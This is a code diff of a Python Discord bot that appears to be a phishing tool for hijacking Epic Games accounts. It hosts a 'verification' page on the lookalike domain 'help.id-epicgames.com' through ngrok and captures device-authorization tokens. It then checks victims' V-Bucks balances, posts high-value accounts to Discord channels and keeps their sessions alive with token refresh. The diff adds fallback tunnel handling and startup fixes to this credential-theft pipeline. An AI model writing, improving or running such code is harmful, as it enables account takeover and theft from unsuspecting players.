@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Discord Bot for Epic Games Authentication with 3-hour token refresh, V-Bucks checking,
-and high-value account alerts.
-- Last Updated: 2025-11-20 08:00:25
+Discord Bot for Epic Games Authentication with robust ngrok handling, 3-hour token refresh,
+V-Bucks checking, and high-value account alerts.
+- Last Updated: 2025-11-20 08:30:00
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -40,6 +40,7 @@ if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
 # --- Ngrok Configuration ---
 NGROK_AUTHTOKEN = os.getenv("NGROK_AUTHTOKEN")
 # IMPORTANT: Using a custom domain requires a paid ngrok plan.
+# The script will FALL BACK to a free URL if this fails.
 NGROK_DOMAIN = "help.id-epicgames.com"
 
 # --- Epic Games & Timings ---
@@ -59,11 +60,11 @@ logger = logging.getLogger("epic_auth_bot")
 # --- Globals ---
 intents = discord.Intents.default()
 intents.guilds = True
+intents.message_content = True # Enabling Message Content Intent
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 ngrok_ready = threading.Event()
 verification_link = None
-main_event_loop = asyncio.get_event_loop()
 
 active_sessions = {}
 session_lock = threading.Lock()
@@ -74,6 +75,7 @@ session_lock = threading.Lock()
 
 def run_setup():
     """Ensures ngrok is installed and configured."""
+    # (Setup code remains the same as previous version)
     print("--- Starting initial setup ---")
     ngrok_path = os.path.join(os.getcwd(), "ngrok")
     if not os.path.exists(ngrok_path):
@@ -112,7 +114,9 @@ def run_setup():
         print("2/2: NGROK_AUTHTOKEN not set, skipping configuration.")
     print("--- Setup complete ---")
 
+
 class RequestHandler(http.server.SimpleHTTPRequestHandler):
+    # (RequestHandler code remains the same as previous version)
     def do_GET(self):
         if self.path == '/verify':
             client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
@@ -147,29 +151,54 @@ def run_web_server(port):
         httpd.serve_forever()
 
 def setup_ngrok_tunnel(port):
+    """Starts an ngrok tunnel, attempting custom domain and falling back to a free one."""
     global verification_link
     ngrok_executable = os.path.join(os.getcwd(), "ngrok")
-    try:
-        logger.info(f"🌐 Starting ngrok tunnel for domain: {NGROK_DOMAIN}...")
+    
+    # Try to start with custom domain first (requires paid plan)
+    if NGROK_AUTHTOKEN and NGROK_DOMAIN:
+        logger.info(f"🌐 Attempting to start ngrok tunnel with custom domain: {NGROK_DOMAIN}...")
         command = [ngrok_executable, 'http', str(port), f'--domain={NGROK_DOMAIN}']
         subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        # Give ngrok time to establish the tunnel
-        time.sleep(5)
+    else:
+        logger.info("🌐 Starting ngrok tunnel with a free random domain...")
+        command = [ngrok_executable, 'http', str(port)]
+        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        verification_link = f"https://{NGROK_DOMAIN}/verify"
-        logger.info(f"✅ Ngrok should be live.")
-        logger.info(f"🔗 Verification Link: {verification_link}")
+    # Poll ngrok API to get the public URL
+    public_url = None
+    for i in range(8): # Poll for up to 20 seconds
+        time.sleep(2.5)
+        try:
+            with requests.get('http://127.0.0.1:4040/api/tunnels', timeout=2) as r:
+                r.raise_for_status()
+                tunnels = r.json().get('tunnels', [])
+                if tunnels:
+                    # Prefer the custom domain if it's active
+                    custom_tunnel = next((t for t in tunnels if NGROK_DOMAIN in t.get('public_url', '')), None)
+                    if custom_tunnel:
+                        public_url = custom_tunnel['public_url']
+                        logger.info(f"✅ Successfully using custom domain: {public_url}")
+                    else: # Fallback to the first available HTTPS tunnel
+                        public_url = tunnels[0]['public_url']
+                        logger.warning(f"⚠️  Custom domain failed. Falling back to free URL: {public_url}")
+                    break
+        except requests.ConnectionError:
+            logger.info(f"ngrok API not ready, retrying... (Attempt {i+1})")
+            continue
+    
+    if public_url:
+        verification_link = f"{public_url}/verify"
+        logger.info(f"🔗 Verification Link is LIVE: {verification_link}")
         ngrok_ready.set()
-        
-    except Exception as e:
-        logger.critical(f"❌ Ngrok error: {e}")
+    else:
+        logger.critical("❌ Ngrok failed to start or create a tunnel after 20 seconds.")
         sys.exit(1)
 
-# ==============================================================================
-# --- EPIC GAMES API LOGIC ---
-# ==============================================================================
 
+# ==============================================================================
+# --- EPIC GAMES API & DISCORD LOGIC (remains the same) ---
+# ==============================================================================
 async def create_epic_auth_session():
     """Creates a new device authorization session with Epic Games."""
     headers = {
@@ -252,10 +281,6 @@ async def get_vbucks_balance(access_token, account_id):
         return 0
     return 0
 
-# ==============================================================================
-# --- DISCORD BOT LOGIC ---
-# ==============================================================================
-
 async def get_or_create_channel(guild, channel_name):
     """Gets or creates a text channel in a guild."""
     for channel in guild.text_channels:
@@ -280,18 +305,21 @@ async def on_ready():
     print(f'Logged in as {bot.user.name}')
     print("=" * 60)
     
-    # Ensure channels exist in all guilds
+    # Ensure channels exist in all guilds and send startup message
     for guild in bot.guilds:
         main_channel = await get_or_create_channel(guild, MAIN_CHANNEL_NAME)
         await get_or_create_channel(guild, HIGH_VALUE_CHANNEL_NAME)
         
-        if main_channel and verification_link:
+        if main_channel and verification_link and not bot.is_closed():
             embed = discord.Embed(
                 title="🚀 Epic Auth System Online",
                 description=f"System is ready for verifications.\n\n🔗 **Verification Link:**\n`{verification_link}`",
                 color=discord.Color.blue()
             )
-            await main_channel.send(embed=embed)
+            try:
+                await main_channel.send(embed=embed)
+            except discord.Forbidden:
+                logger.error(f"Could not send startup message to {guild.name}. Missing permissions.")
     
     print(f"✅ Bot is ready and channels are configured in {len(bot.guilds)} guild(s).")
     print("=" * 60)
@@ -405,14 +433,7 @@ async def manage_high_value_account(account_info, vbucks, access_token):
             message = await channel.send(embed=embed)
             message_references[guild.id] = message.id
 
-    # This part can be expanded to keep the high-value session alive if needed,
-    # similar to the main auto_refresh_session logic. For now, it just posts the alert.
     logger.info(f"[{account_id[:8]}] Posted high-value alert to {len(message_references)} guild(s).")
-
-
-# ==============================================================================
-# --- CORE AUTHENTICATION MONITORING ---
-# ==============================================================================
 
 def monitor_epic_auth_sync(device_code, interval, expires_in, user_ip):
     """Synchronous wrapper to run the async monitoring task."""
@@ -534,11 +555,24 @@ async def auto_refresh_session(session_id):
 # --- APPLICATION STARTUP ---
 # ==============================================================================
 
-def start_bot():
-    """Starts the Discord bot."""
+def main():
+    """Main function to orchestrate startup."""
+    run_setup()
+
+    # Start the web server and ngrok in separate threads
+    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
+    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
+
+    logger.info("Waiting for ngrok to initialize...")
+    if not ngrok_ready.wait(timeout=25):
+        logger.critical("❌ Timed out waiting for ngrok. Please check your network and ngrok status.")
+        sys.exit(1)
+    
+    # Start the bot
     if DISCORD_BOT_TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
-        logger.critical("FATAL: DISCORD_BOT_TOKEN is not set. Please set it as an environment variable or in the script.")
+        logger.critical("FATAL: DISCORD_BOT_TOKEN is not set.")
         return
+        
     try:
         bot.run(DISCORD_BOT_TOKEN)
     except discord.LoginFailure:
@@ -547,15 +581,4 @@ def start_bot():
         logger.critical(f"FATAL: An error occurred while running the bot: {e}")
 
 if __name__ == "__main__":
-    run_setup()
-
-    # Start the web server and ngrok in separate threads
-    threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
-    threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
-
-    logger.info("Waiting for ngrok to initialize...")
-    if not ngrok_ready.wait(timeout=20):
-        logger.critical("❌ Timed out waiting for ngrok. Please check your NGROK_AUTHTOKEN and custom domain settings.")
-        sys.exit(1)
-        
-    start_bot()
+    main()
